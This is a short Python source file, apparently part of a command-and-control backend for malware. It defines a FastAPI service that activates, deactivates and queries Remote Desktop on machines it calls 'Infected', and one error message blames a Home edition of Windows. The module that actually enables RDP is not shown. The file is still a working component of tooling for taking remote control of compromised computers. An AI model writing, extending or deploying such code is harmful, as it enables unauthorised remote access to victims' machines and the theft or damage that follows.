from modules.RdpModule import RdpModule
from fastapi import HTTPException

class RdpService:
    def __init__(self, rdpModule: RdpModule) -> None:
        self.rdpModule = rdpModule

    async def activate(self, id: str):
        try:
            response = await self.rdpModule.activate(id)
        except Exception as e:
            raise HTTPException(status_code=400, detail=str(e))
        if response["message"].startswith("Infected does not have Remote Desktop feature installed."):
            raise HTTPException(status_code=500, detail="Infected does not have Remote Desktop feature installed. He probably runs a Home edition of Windows.")
        return response
    
    async def deactivate(self, id: str):
        try:
            return await self.rdpModule.deactivate(id)
        except Exception as e:
            raise HTTPException(status_code=400, detail=str(e))
    
    async def status(self, id: str):
        try:
            return await self.rdpModule.status(id)
        except Exception as e:
            raise HTTPException(status_code=400, detail=str(e))